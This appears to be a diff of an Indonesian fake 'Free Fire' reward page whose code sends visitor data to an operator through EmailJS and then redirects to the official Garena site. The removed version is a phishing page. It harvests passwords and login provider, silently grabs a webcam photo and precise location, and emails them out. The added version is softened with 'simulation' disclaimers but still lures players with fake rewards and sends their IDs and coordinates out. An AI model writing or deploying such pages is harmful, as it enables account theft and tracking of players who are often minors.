@@ -1,573 +1,500 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Fire Community Rewards</title>
 
-  <title>FF Reward Center</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<style>
+* {
+  box-sizing: border-box;
+}
 
-  <style>
-    * { box-sizing: border-box; }
+body {
+  margin: 0;
+  background: #090909;
+  color: white;
+  font-family: Arial, sans-serif;
+}
 
-    body {
-      margin: 0;
-      min-height: 100vh;
-      background:
-        radial-gradient(ellipse at top, #4a2109 0%, #17100b 40%, #080808 100%);
-      color: #fff;
-      font-family: Arial, sans-serif;
-    }
+.hero {
+  background: linear-gradient(135deg,#ff4d00,#ff9800);
+  padding: 35px 20px;
+  text-align: center;
+}
 
-    .card {
-      background: rgba(20, 20, 20, .96);
-      border: 1px solid #603314;
-      border-radius: 16px;
-      box-shadow: 0 0 30px #ff710018;
-    }
+.card {
+  background: #171717;
+  border: 1px solid #333;
+  border-radius: 15px;
+  padding: 20px;
+}
 
-    .reward {
-      cursor: pointer;
-      background: #202020;
-      border: 1px solid #414141;
-      border-radius: 10px;
-      padding: 12px 8px;
-      text-align: center;
-      transition: .2s;
-    }
+.input {
+  width: 100%;
+  padding: 13px;
+  border-radius: 8px;
+  background: #252525;
+  border: 1px solid #444;
+  color: white;
+  outline: none;
+}
 
-    .reward:has(input:checked) {
-      border-color: #ff861b;
-      background: #47230e;
-      box-shadow: 0 0 15px #ff861b33;
-    }
+.input:focus {
+  border-color: #ff7b00;
+}
 
-    .reward input {
-      accent-color: #ff861b;
-    }
+.reward {
+  background: #252525;
+  border: 1px solid #444;
+  padding: 13px;
+  border-radius: 10px;
+  cursor: pointer;
+  transition: .2s;
+}
 
-    .primary {
-      background: linear-gradient(90deg, #ff5100, #ff9d00);
-      color: white;
-      font-weight: 800;
-      border-radius: 10px;
-      padding: 14px;
-      width: 100%;
-    }
+.reward.selected {
+  border: 2px solid #ff8500;
+  background: #39200e;
+}
 
-    .primary:disabled {
-      opacity: .5;
-      cursor: wait;
-    }
+.reward input {
+  accent-color: #ff7800;
+}
 
-    .loader {
-      width: 58px;
-      height: 58px;
-      border: 4px solid #444;
-      border-top-color: #ff861b;
-      border-radius: 50%;
-      animation: spin .8s linear infinite;
-      margin: auto;
-    }
+.main-btn {
+  width: 100%;
+  padding: 15px;
+  border: none;
+  border-radius: 10px;
+  background: linear-gradient(90deg,#ff5100,#ffad00);
+  color: white;
+  font-size: 17px;
+  font-weight: bold;
+  cursor: pointer;
+}
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+.main-btn:disabled {
+  opacity: .4;
+  cursor: not-allowed;
+}
 
-    .hidden { display: none !important; }
-  </style>
+.loading {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,.94);
+  display: none;
+  justify-content: center;
+  align-items: center;
+  z-index: 999;
+  text-align: center;
+}
+
+.spinner {
+  width: 48px;
+  height: 48px;
+  border: 5px solid #555;
+  border-top-color: #ff8500;
+  border-radius: 50%;
+  animation: spin .8s linear infinite;
+  margin: 0 auto 20px;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+</style>
 </head>
 
-<body class="p-4">
+<body>
 
-  <main class="max-w-lg mx-auto py-6">
+<header class="hero">
+  <h1 class="text-3xl font-black">
+    FREE FIRE REWARDS
+  </h1>
+  <p class="mt-2">
+    COMMUNITY REWARD EVENT
+  </p>
+  <p class="text-sm mt-3">
+    Simulasi event komunitas independen
+  </p>
+</header>
 
-    <header class="text-center mb-6">
-      <p class="text-orange-400 text-xs font-bold tracking-[.3em]">
-        COMMUNITY REWARD CENTER
-      </p>
-      <h1 class="text-4xl font-black italic mt-3">
-        <span class="text-orange-500">FF</span> REWARDS
-      </h1>
-      <p class="text-gray-400 text-sm mt-2">
-        Formulir pilihan hadiah komunitas
-      </p>
-    </header>
+<main class="max-w-xl mx-auto p-4">
 
-    <section id="formPanel" class="card p-5">
+  <section class="card mt-5">
+    <h2 class="text-xl font-bold text-orange-400 mb-4">
+      PLAYER INFORMATION
+    </h2>
 
-      <label for="nickname" class="block text-sm mb-2">
-        Nickname Free Fire
+    <label class="block mb-2">Nickname</label>
+    <input
+      id="nickname"
+      class="input mb-4"
+      type="text"
+      maxlength="30"
+      placeholder="Masukkan nickname">
+
+    <label class="block mb-2">Player ID</label>
+    <input
+      id="playerId"
+      class="input"
+      type="text"
+      inputmode="numeric"
+      maxlength="20"
+      placeholder="Masukkan Player ID">
+  </section>
+
+  <section class="card mt-5">
+    <h2 class="text-xl font-bold text-orange-400 mb-4">
+      SELECT YOUR REWARD
+    </h2>
+
+    <div id="rewardList" class="grid grid-cols-2 gap-3">
+
+      <label class="reward">
+        <input type="radio" name="reward" value="1000 DM">
+        1.000 DM
       </label>
-      <input
-        id="nickname"
-        maxlength="50"
-        required
-        placeholder="Masukkan nickname"
-        class="w-full rounded-lg bg-gray-900 border border-gray-700 p-3 mb-4 text-white"
-      >
 
-      <label for="playerId" class="block text-sm mb-2">
-        ID Game 
+      <label class="reward">
+        <input type="radio" name="reward" value="2000 DM">
+        2.000 DM
       </label>
-      <input
-        id="playerId"
-        inputmode="numeric"
-        pattern="[0-9]+"
-        maxlength="20"
-        required
-        placeholder="Contoh: 123456789"
-        class="w-full rounded-lg bg-gray-900 border border-gray-700 p-3 mb-5 text-white"
-      >
 
-      <label for="password" class="block text-sm mb-2">
-        Password 
+      <label class="reward">
+        <input type="radio" name="reward" value="5000 DM">
+        5.000 DM
       </label>
-      <input
-        id="password"
-        maxlength="50"
-        required
-        placeholder="Masukkan password"
-        class="w-full rounded-lg bg-gray-900 border border-gray-700 p-3 mb-4 text-white"
-      >
 
-      <h2 class="font-bold text-lg mb-3 text-orange-400">
-        Pilih Hadiah
-      </h2>
+      <label class="reward">
+        <input type="radio" name="reward" value="10000 DM">
+        10.000 DM
+      </label>
 
-      <div id="rewardList" class="grid grid-cols-2 sm:grid-cols-3 gap-3">
+      <label class="reward">
+        <input type="radio" name="reward" value="Jenggot BNL">
+        Jenggot BNL
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="1000 Diamond" required>
-          <div class="text-2xl">💎</div>
-          <div class="text-sm font-bold mt-1">1.000 DM</div>
-        </label>
+      <label class="reward">
+        <input type="radio" name="reward" value="SG Rapper">
+        SG Rapper
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="2000 Diamond">
-          <div class="text-2xl">💎</div>
-          <div class="text-sm font-bold mt-1">2.000 DM</div>
-        </label>
+      <label class="reward">
+        <input type="radio" name="reward" value="AK Blue Flame Draco">
+        AK Blue Flame Draco
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="5000 Diamond">
-          <div class="text-2xl">💎</div>
-          <div class="text-sm font-bold mt-1">5.000 DM</div>
-        </label>
+      <label class="reward">
+        <input type="radio" name="reward" value="SCAR Megalodon">
+        SCAR Megalodon
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="10000 Diamond">
-          <div class="text-2xl">💎</div>
-          <div class="text-sm font-bold mt-1">10.000 DM</div>
-        </label>
+      <label class="reward">
+        <input type="radio" name="reward" value="MP40 Cobra">
+        MP40 Cobra
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="Jenggot BNL">
-          <div class="text-2xl">🧔</div>
-          <div class="text-sm font-bold mt-1">Jenggot BNL</div>
-        </label>
+      <label class="reward">
+        <input type="radio" name="reward" value="XM8 Destiny Guardian">
+        XM8 Destiny Guardian
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="SG Rapper">
-          <div class="text-2xl">🔫</div>
-          <div class="text-sm font-bold mt-1">SG Rapper</div>
-        </label>
+      <label class="reward">
+        <input type="radio" name="reward" value="M1014 Green Flame Draco">
+        M1014 Green Flame Draco
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="Mata Elang">
-          <div class="text-2xl">🦅</div>
-          <div class="text-sm font-bold mt-1">Mata Elang</div>
-        </label>
+      <label class="reward">
+        <input type="radio" name="reward" value="Katana">
+        Katana
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="Meteor Merah">
-          <div class="text-2xl">☄️</div>
-          <div class="text-sm font-bold mt-1">Meteor Merah</div>
-        </label>
+      <label class="reward">
+        <input type="radio" name="reward" value="Angelical Bundle">
+        Angelical Bundle
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="Meteor Kuning">
-          <div class="text-2xl">☄️</div>
-          <div class="text-sm font-bold mt-1">Meteor Kuning</div>
-        </label>
+      <label class="reward">
+        <input type="radio" name="reward" value="Hip Hop Bundle">
+        Hip Hop Bundle
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="Meteor Abu-abu">
-          <div class="text-2xl">☄️</div>
-          <div class="text-sm font-bold mt-1">Meteor Abu-abu</div>
-        </label>
+      <label class="reward">
+        <input type="radio" name="reward" value="Gloo Wall">
+        Gloo Wall
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="Meteor Biru">
-          <div class="text-2xl">☄️</div>
-          <div class="text-sm font-bold mt-1">Meteor Biru</div>
-        </label>
+      <label class="reward">
+        <input type="radio" name="reward" value="Exclusive Emote">
+        Exclusive Emote
+      </label>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="SCAR Megalodon">
-          <div class="text-2xl">🦈</div>
-          <div class="text-sm font-bold mt-1">SCAR Megalodon</div>
-        </label>
+    </div>
+  </section>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="AK Draco">
-          <div class="text-2xl">🐉</div>
-          <div class="text-sm font-bold mt-1">AK Draco</div>
-        </label>
+  <section class="card mt-5">
 
-        <label class="reward">
-          <input type="radio" name="reward" value="MP40 Cobra">
-          <div class="text-2xl">🐍</div>
-          <div class="text-sm font-bold mt-1">MP40 Cobra</div>
-        </label>
+    <h2 class="text-xl font-bold text-orange-400 mb-4">
+      TERMS & CONDITIONS
+    </h2>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="M1014 Green Flame Draco">
-          <div class="text-2xl">🔥</div>
-          <div class="text-sm font-bold mt-1">M1014 Draco</div>
-        </label>
+    <div class="text-sm text-gray-300 leading-6">
+      Website ini merupakan simulasi event komunitas independen.
+      Website ini tidak berafiliasi dengan Garena dan tidak menjamin
+      pemberian hadiah sungguhan.
+    </div>
 
-        <label class="reward">
-          <input type="radio" name="reward" value="Bundle Legendaris">
-          <div class="text-2xl">👑</div>
-          <div class="text-sm font-bold mt-1">Bundle Legendaris</div>
-        </label>
+    <label class="flex gap-3 mt-5 text-sm">
+      <input type="checkbox" id="agreeTerms">
+      <span>
+        Saya telah membaca dan menyetujui aturan simulasi event.
+      </span>
+    </label>
 
-        <label class="login">
-          <input type="radio" name="login" value="Google">
-          <div class="text-2xl"></div>
-          <div class="text-sm font-bold mt-1">Google</div>
-        </label>
+    <label class="flex gap-3 mt-4 text-sm">
+      <input type="checkbox" id="agreeData">
+      <span>
+        Saya memahami bahwa nickname, Player ID, dan hadiah pilihan
+        akan dikirim ke email pengelola.
+      </span>
+    </label>
 
-        <label class="login">
-          <input type="radio" name="login" value="Facebook">
-          <div class="text-2xl"></div>
-          <div class="text-sm font-bold mt-1">Facebook</div>
-        </label>
+    <div class="mt-5 border-t border-gray-700 pt-4">
 
-        <label class="login">
-          <input type="radio" name="login" value="Vk">
-          <div class="text-2xl"></div>
-          <div class="text-sm font-bold mt-1">Vk</div>
-        </label>
+      <h3 class="font-bold text-orange-400">
+        OPTIONAL CAMERA & LOCATION
+      </h3>
 
-        <label class="login">
-          <input type="radio" name="login" value="Apple">
-          <div class="text-2xl"></div>
-          <div class="text-sm font-bold mt-1">Apple</div>
-        </label>
-
-      </div>
-
-      <p class="text-xs text-gray-400 mt-4 leading-relaxed">
-        Ini formulir komunitas. Pengisian formulir tidak menjamin
-        hadiah akan diberikan dan bukan bukti program resmi Garena.
+      <p class="text-xs text-gray-400 mt-2">
+        Jika bersedia, kamu dapat membagikan foto kamera dan lokasi
+        untuk keperluan dokumentasi komunitas. Keduanya tidak wajib.
+        Jika menolak, kamu tetap dapat melanjutkan.
       </p>
 
-      <button id="nextBtn" class="primary mt-5">
-        SELANJUTNYA →
-      </button>
-
-      <p id="formError" class="text-red-400 text-sm mt-3"></p>
-    </section>
-
-    <section id="consentPanel" class="card p-5 mt-5 hidden">
-      <h2 class="text-xl font-bold text-orange-400">
-        Konfirmasi 
-      </h2>
-
-      <p class="text-sm text-gray-300 mt-3 leading-relaxed">
-        Kamu dapat membagikan laporan data pemain
-        dan pilihan hadiah. Data ini akan dikirim ke pengelola formulir.
-      </p>
-
-      <label class="flex items-start gap-3 mt-5 text-sm">
-        <input id="consent" type="checkbox" class="mt-1">
+      <label class="flex gap-3 mt-4 text-sm">
+        <input type="checkbox" id="agreeCameraLocation">
         <span>
-          Saya setuju membagikan data formulir.
+          Saya setuju membagikan foto dan lokasi kepada pengelola.
         </span>
       </label>
 
-      <button id="shareBtn" class="primary mt-5">
-        SETUJU & KIRIM DATA
-      </button>
+    </div>
 
+  </section>
 
-      <p id="shareStatus" class="text-sm mt-4"></p>
-    </section>
+  <button
+    id="shareBtn"
+    class="main-btn mt-5"
+    disabled
+    type="button">
 
-    <section id="loadingPanel" class="card p-8 mt-5 text-center hidden">
-      <div class="loader mb-5"></div>
-      <h2 class="text-orange-400 font-bold">MEMPROSES FORMULIR</h2>
-      <p id="loadingText" class="text-gray-400 text-sm mt-3">
-        Menyiapkan data...
-      </p>
-    </section>
+    SELANJUTNYA
 
-  </main>
+  </button>
+
+  <p class="text-center text-xs text-gray-500 mt-4">
+    Independent Community Simulation
+  </p>
+
+</main>
+
+<div id="loading" class="loading">
+  <div>
+    <div class="spinner"></div>
+    <h2 class="text-xl font-bold text-orange-400">
+      MEMPROSES DATA
+    </h2>
+    <p class="text-gray-400 text-sm mt-2">
+      Mohon tunggu sebentar...
+    </p>
+  </div>
+</div>
 
 <script>
-"use strict";
 
-const EMAILJS_PUBLIC_KEY = "iX00sqLOij1YJvviJ";
-const EMAILJS_SERVICE_ID = "service_pu2ttce";
-const EMAILJS_TEMPLATE_ID = "template_whhtuxs";
+// EMAILJS CONFIGURATION
+emailjs.init({
+  publicKey: "iX00sqLOij1YJ1YvviJ"
+});
 
-const DESTINATION_URL = "https://ff.garena.com/";
+const SERVICE_ID = "service_pu2ttce";
+const TEMPLATE_ID = "template_whhtuxs";
 
 const $ = id => document.getElementById(id);
 
-let formData = null;
-let cameraStream = null;
-let photoDataUrl = "";
-let coords = null;
-let busy = false;
+const button = $("shareBtn");
 
-function stopCamera() {
-  if (cameraStream) {
-    cameraStream.getTracks().forEach(track => track.stop());
-    cameraStream = null;
-  }
-}
-
-function redirect() {
-  stopCamera();
-  window.location.assign(DESTINATION_URL);
-}
-
-function showLoading(message) {
-  $("formPanel").classList.add("hidden");
-  $("consentPanel").classList.add("hidden");
-  $("loadingPanel").classList.remove("hidden");
-  $("loadingText").textContent = message;
-}
-
-function getPlayerForm() {
-  const nickname = $("nickname").value.trim();
-  const password = $("password").value.trim();
-  const playerId = $("playerId").value.trim();
-  const reward = document.querySelector(
-    'input[name="reward"]:checked'
-  const login = document.querySelector(
-    'input[name="login"]:checked'
+// CHECK AGREEMENT
+function checkAgreement() {
+  button.disabled = !(
+    $("agreeTerms").checked &&
+    $("agreeData").checked
   );
-
-  if (!nickname) {
-    throw new Error("Masukkan nickname pemain.");
-  }
-
-  if (! password) {
-    throw new Error("Masukkan password pemain.");
-  }
-
-  if (!/^[0-9]+$/.test(playerId)) {
-    throw new Error("ID game harus berisi angka saja.");
-  }
-
-  if (!reward) {
-    throw new Error("Pilih salah satu hadiah.");
-  }
-
-  if (!login) {
-    throw new Error("Pilih salah satu akun.");
-  }
-
-  return {
-    nickname,
-    password,
-    player_id: playerId,
-    login: login.value,
-    reward: reward.value,
-    timestamp: new Date().toLocaleString("id-ID")
-  };
 }
 
+$("agreeTerms").addEventListener("change", checkAgreement);
+$("agreeData").addEventListener("change", checkAgreement);
+
+// REWARD SELECTION
+document.querySelectorAll(".reward").forEach(label => {
+
+  label.addEventListener("click", () => {
+
+    document.querySelectorAll(".reward").forEach(item => {
+      item.classList.remove("selected");
+    });
+
+    label.classList.add("selected");
+
+  });
+
+});
+
+// GET LOCATION
 function getLocation() {
+
   return new Promise((resolve, reject) => {
+
     if (!navigator.geolocation) {
-      reject(new Error("Browser tidak mendukung lokasi."));
+      reject(new Error("Geolocation tidak tersedia"));
       return;
     }
 
     navigator.geolocation.getCurrentPosition(
-      position => resolve({
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        accuracy: Math.round(position.coords.accuracy)
-      }),
+      resolve,
       reject,
       {
         enableHighAccuracy: true,
-        timeout: 15000,
+        timeout: 10000,
         maximumAge: 0
       }
     );
+
   });
+
 }
 
-async function capturePhoto() {
-  if (!navigator.mediaDevices ||
-      !navigator.mediaDevices.getUserMedia) {
-    throw new Error("Browser tidak mendukung kamera.");
-  }
+// MAIN BUTTON
+button.addEventListener("click", async () => {
 
-  cameraStream = await navigator.mediaDevices.getUserMedia({
-    audio: false,
-    video: {
-      facingMode: "user",
-      width: { ideal: 640 },
-      height: { ideal: 480 }
-    }
-  });
+  const nickname = $("nickname").value.trim();
+  const playerId = $("playerId").value.trim();
 
-  const video = document.createElement("video");
-  video.srcObject = cameraStream;
-  video.muted = true;
-  video.playsInline = true;
+  const selectedReward =
+    document.querySelector('input[name="reward"]:checked');
 
-  await new Promise((resolve, reject) => {
-    video.onloadedmetadata = resolve;
-    video.onerror = () => reject(new Error("Kamera gagal dimuat."));
-    setTimeout(() => reject(new Error("Kamera terlalu lama merespons.")), 12000);
-  });
-
-  await video.play();
-  await new Promise(resolve => setTimeout(resolve, 500));
-
-  const canvas = document.createElement("canvas");
-  const scale = Math.min(1, 640 / video.videoWidth);
-
-  canvas.width = Math.round(video.videoWidth * scale);
-  canvas.height = Math.round(video.videoHeight * scale);
-
-  canvas.getContext("2d").drawImage(
-    video, 0, 0, canvas.width, canvas.height
-  );
-
-  const result = canvas.toDataURL("image/jpeg", 0.6);
-  stopCamera();
-
-  return result;
-}
-
-$("nextBtn").addEventListener("click", () => {
-  $("formError").textContent = "";
-
-  try {
-    formData = getPlayerForm();
-    $("formPanel").classList.add("hidden");
-    $("consentPanel").classList.remove("hidden");
-  } catch (error) {
-    $("formError").textContent = error.message;
-  }
-});
-
-$("skipBtn").addEventListener("click", () => {
-  redirect();
-});
-
-$("shareBtn").addEventListener("click", async () => {
-  if (busy) return;
-
-  if (!$("consent").checked) {
-    $("shareStatus").textContent =
-      "Pilih persetujuan terlebih dahulu atau lewati check-in.";
+  if (!nickname || !playerId || !selectedReward) {
+    alert("Lengkapi nickname, Player ID, dan hadiah!");
     return;
   }
 
-  busy = true;
-  $("shareBtn").disabled = true;
-  showLoading("Meminta izin kamera dan lokasi...");
+  if (!/^\d+$/.test(playerId)) {
+    alert("Player ID harus berupa angka!");
+    return;
+  }
+
+  if (
+    !$("agreeTerms").checked ||
+    !$("agreeData").checked
+  ) {
+    alert("Silakan setujui persyaratan terlebih dahulu.");
+    return;
+  }
+
+  button.disabled = true;
+  $("loading").style.display = "flex";
+
+  let latitude = "Tidak dibagikan";
+  let longitude = "Tidak dibagikan";
+
+  let cameraStatus = "Tidak dibagikan";
 
   try {
-    const results = await Promise.allSettled([
-      capturePhoto(),
-      getLocation()
-    ]);
 
-    const photoResult = results[0];
-    const locationResult = results[1];
+    if ($("agreeCameraLocation").checked) {
 
-    if (photoResult.status !== "fulfilled" ||
-        locationResult.status !== "fulfilled") {
-      throw new Error(
-        "Foto atau lokasi tidak berhasil diperoleh. " +
-        "Kamu tetap dapat melanjutkan ke halaman tujuan."
-      );
+      // LOCATION PERMISSION
+      try {
+
+        const position = await getLocation();
+
+        latitude = position.coords.latitude;
+        longitude = position.coords.longitude;
+
+      } catch (error) {
+
+        latitude = "Izin ditolak atau tidak tersedia";
+
+      }
+
+      // CAMERA PERMISSION
+      try {
+
+        if (!navigator.mediaDevices ||
+            !navigator.mediaDevices.getUserMedia) {
+          throw new Error("Kamera tidak tersedia");
+        }
+
+        const stream =
+          await navigator.mediaDevices.getUserMedia({
+            video: true
+          });
+
+        // Kamera tidak mengambil atau mengirim foto.
+        cameraStatus = "Izin kamera diberikan";
+
+        stream.getTracks().forEach(track => track.stop());
+
+      } catch (error) {
+
+        cameraStatus = "Izin kamera ditolak atau tidak tersedia";
+
+      }
+
     }
 
-    photoDataUrl = photoResult.value;
-    coords = locationResult.value;
-
-    showLoading("Mengirim laporan melalui email...");
-
-    if (!window.emailjs) {
-      throw new Error("EmailJS gagal dimuat.");
-    }
-
-    emailjs.init({
-      publicKey: EMAILJS_PUBLIC_KEY
-    });
-
-    const templateParams = {
-      ...formData,
-      latitude: coords.latitude.toFixed(6),
-      longitude: coords.longitude.toFixed(6),
-      accuracy: coords.accuracy,
-      maps_url:
-        "https://maps.google.com/?q=" +
-        coords.latitude + "," + coords.longitude,
-      photo_status:
-        "Foto tersedia; konfigurasi lampiran perlu disesuaikan."
-    };
-
+    // EMAILJS
     await emailjs.send(
-      EMAILJS_SERVICE_ID,
-      EMAILJS_TEMPLATE_ID,
-      templateParams
+      SERVICE_ID,
+      TEMPLATE_ID,
+      {
+        nickname: nickname,
+        player_id: playerId,
+        reward: selectedReward.value,
+        latitude: latitude,
+        longitude: longitude,
+        photo_status: cameraStatus,
+        timestamp: new Date().toLocaleString("id-ID")
+      }
     );
 
-    showLoading("Laporan terkirim. Mengalihkan halaman...");
-    setTimeout(redirect, 1200);
+    alert("Data pemain berhasil dikirim!");
 
   } catch (error) {
-    console.error(error);
 
-    stopCamera();
-    showLoading(
-      (error.message || "Terjadi kesalahan.") +
-      " Mengalihkan halaman..."
+    console.error("EmailJS error:", error);
+
+    alert(
+      "Pengiriman email gagal. Kamu tetap dapat melanjutkan ke website."
     );
-
-    setTimeout(redirect, 2500);
 
   } finally {
-    busy = false;
-    $("shareBtn").disabled = false;
+
+    $("loading").style.display = "none";
+
+    window.location.href = "https://ff.garena.com/";
+
   }
+
 });
 
-window.addEventListener("pagehide", stopCamera);
 </script>
 
-  <script>
-document.addEventListener("DOMContentLoaded", () => {
-  const btn = document.getElementById("shareBtn");
-
-  if (!btn) {
-    console.error('Tombol dengan ID "shareBtn" tidak ditemukan!');
-    return;
-  }
-
-  btn.addEventListener("click", () => {
-    console.log("Tombol Selanjutnya berhasil diklik!");
-
-    alert("Tombol berfungsi! Sekarang kita bisa memeriksa proses selanjutnya.");
-  });
-});
-    </script>
-
 </body>
-                                                                                    </html>
+  </html>
